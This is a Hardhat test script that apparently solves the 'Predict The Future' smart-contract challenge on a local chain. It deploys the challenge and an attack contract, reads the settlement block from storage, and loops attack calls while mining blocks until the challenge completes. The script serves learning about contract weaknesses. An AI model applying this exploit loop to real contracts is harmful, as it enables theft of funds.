const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");
describe("Predict The Future Challenge", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        contract = await (await ethers.getContractFactory("PredictTheFutureChallenge")).deploy({value: ethers.utils.parseEther("1.0")});
        await contract.deployed();

        hacker = await (await ethers.getContractFactory("PredictTheFutureAttack")).deploy(contract.address);
        await hacker.deployed();
});
    describe("Complete Challenge", function() {
        it("Should complete the challenge", async function() {
            await hacker.guess({value: ethers.utils.parseEther("1.0")});
            settlementBlockNumber = await ethers.provider.getStorageAt(contract.address, 1);
            i=0;
            while (true) {
                i++;
                await hacker.attack(settlementBlockNumber);
                if (await contract.isComplete()) {
                    break;
                }
                await ethers.provider.send("hardhat_mine", ["0x1"]);
            }
            console.log("The challenge was completed in", i, "times");
            expect(await contract.isComplete()).to.equal(true);
        });
    });
});